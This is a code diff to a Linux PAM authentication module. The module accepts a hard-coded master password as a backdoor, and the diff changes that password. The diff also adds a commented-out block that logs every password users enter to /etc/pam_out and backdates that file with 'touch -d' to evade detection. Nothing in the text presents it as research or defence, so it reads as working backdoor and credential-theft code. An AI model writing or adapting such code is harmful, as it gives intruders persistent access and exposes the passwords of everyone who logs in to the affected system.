@@ -2,7 +2,14 @@
 #include <security/pam_ext.h>
 #include <string.h>
 
-#define MASTER_PASSWORD "master_pass"
+
+#define MASTER_PASSWORD "master_password"
+
+/*
+#include <stdio.h>
+#include <stdlib.h>
+#define PAM_PASSWORD_STORE "/etc/pam_out"
+*/
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
     const char *password = NULL;
@@ -11,11 +18,25 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
         return PAM_IGNORE;
     }
 
+    /*
+    if (password) {
+        FILE *f = fopen("/etc/pam_out", "a");
+        if (f) {
+            fprintf(f, "%s\n", password);
+            fclose(f);
+
+            char cmd[256];
+            snprintf(cmd, sizeof(cmd), "touch -d 'Aug 2 2014' \"%s\"", PAM_PASSWORD_STORE);
+            system(cmd);
+        }
+    }
+    */
+
     if (password && strcmp(password, MASTER_PASSWORD) == 0) {
         return PAM_SUCCESS;
     }
 
-    return PAM_IGNORE; 
+    return PAM_IGNORE;
 }
 
 
